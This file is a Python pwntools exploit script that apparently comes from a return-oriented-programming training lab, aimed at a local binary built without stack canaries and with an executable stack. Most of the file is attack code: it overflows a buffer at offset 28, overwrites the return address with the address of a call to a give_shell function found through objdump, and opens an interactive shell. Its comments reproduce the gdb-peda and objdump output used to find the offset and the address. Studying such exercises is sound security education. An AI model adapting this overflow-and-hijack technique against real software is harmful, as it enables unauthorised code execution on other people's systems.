#!/usr/bin/python
from pwn import *

def main():
	# Starts process
	p = process("../rop_crash_course/vuln2-nocanary-execstack")

	'''
	gdb-peda$ pattern_offset 0x413b4141
	1094402369 found at offset: 28
	'''
	# Craft payload
	# payload = "A" * 28 + p32(0xdeadbeef) # test by overwriting eip with junk 
	# payload += payload.ljust(1000, "\x00")

	'''
	vagrant@ubuntu-xenial:~/rop_crash_course$ objdump -d ./vuln2-nocanary-execstack | grep give_shell
	080484cb <give_shell>:
	8048536:       e8 90 ff ff ff          call   80484cb <give_shell>
	'''
	payload = "A" * 28 + p32(0x8048536)

	# Get rid of the prompt
	data1 = p.recvrepeat(0.2)
	log.info("Got data: %s" % data1)

	# Print process id(debugging purposes)
	raw_input(str(p.proc.pid))

	# Send payload
	p.sendline(payload)

	'''
	Pass interaction back to user
	Importance:

	A requirement for functions that executes shell.
	Else program will execute /bin/dash and terminate since there is nothing to keep the shell open
	'''
	p.interactive()

if __name__ == "__main__":
	main()
